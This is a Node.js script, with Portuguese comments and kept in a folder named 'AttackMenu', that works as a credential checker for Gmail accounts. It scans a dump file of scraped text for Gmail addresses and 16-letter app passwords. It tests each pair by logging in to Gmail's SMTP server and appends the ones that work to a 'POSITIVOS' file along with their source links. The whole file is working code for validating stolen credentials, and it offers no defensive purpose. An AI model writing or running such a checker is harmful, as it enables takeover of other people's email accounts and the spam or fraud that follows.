import nodemailer from "nodemailer";
import fs from "fs/promises";
import chalk from "chalk";

const INPUT_FILE = "D:\\programming\\novo\\filmes-online\\dum\\email.txt";
const POSITIVES =
  "D:\\programming\\novo\\filmes-online\\src\\AttackMenu\\emails\\POSITIVOS.txt";
const MANUAL =
  "D:\\programming\\novo\\filmes-online\\src\\AttackMenu\\emails\\ConsultManual.txt";

/**
 * REGEX ATUALIZADA:
 * Captura sequências de 16 letras minúsculas que podem estar:
 * - Juntas: abcdefghijklmnop
 * - Com espaços: abcd efgh ijkl mnop
 * - Com traços: abcd-efgh-ijkl-mnop
 */
const REGEX_GMAIL_APP_PASS =
  /\b([a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}|[a-z]{16})\b/g;
const REGEX_EMAIL = /\b[a-zA-Z0-9._%+-]+@gmail\.com\b/i;

async function testSMTP(user, pass) {
  // Remove TUDO que não for letra minúscula (espaços, traços, números que sobraram)
  const cleanPass = pass.replace(/[^a-z]/g, "");

  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false, // TLS
    auth: { user: user, pass: cleanPass },
    connectionTimeout: 5000, // Timeout reduzido para performance
  });

  try {
    await transporter.verify();
    return { success: true, finalPass: cleanPass };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

async function run() {
  try {
    const rawContent = await fs.readFile(INPUT_FILE, "utf-8");
    const blocks = rawContent.split(
      "------------------------------------------------------------",
    );

    console.log(chalk.blue(`[*] Analisando ${blocks.length} blocos...\n`));

    for (const block of blocks) {
      if (!block.trim()) continue;

      // Pegamos o link para referência no log
      const linkMatch = block.match(/LINK:\s+(.+)/);
      const link = linkMatch ? linkMatch[1] : "N/A";

      // Procurar todos os emails e senhas no bloco
      const emailMatch = block.match(REGEX_EMAIL);
      // Resetamos o index da regex global antes de usar
      REGEX_GMAIL_APP_PASS.lastIndex = 0;
      const passMatch = REGEX_GMAIL_APP_PASS.exec(block);

      if (emailMatch && passMatch) {
        const email = emailMatch[0].toLowerCase();
        const rawPass = passMatch[0];
        const cleanPass = rawPass.replace(/[^a-z]/g, "");

        if (cleanPass.length === 16) {
          console.log(
            chalk.yellow(`[>] Testando: ${email} | Pass Original: ${rawPass}`),
          );

          const result = await testSMTP(email, cleanPass);

          if (result.success) {
            console.log(chalk.green(`[+] SUCESSO!!! -> ${email}:${cleanPass}`));
            await fs.appendFile(
              POSITIVES,
              `${email}:${cleanPass} | Link: ${link}\n`,
            );
          } else {
            console.log(
              chalk.red(`[-] Falha: ${email} (${result.error.split("\n")[0]})`),
            );
          }
        }
      } else if (emailMatch) {
        // Encontrou email mas não a senha padrão de 16 letras
        await fs.appendFile(MANUAL, `Revisão manual necessária: ${link}\n`);
      }
    }
    console.log(chalk.magenta("\n[FIM] Processamento concluído."));
  } catch (err) {
    console.error(chalk.bgRed(" Erro Crítico: "), err);
  }
}

run();
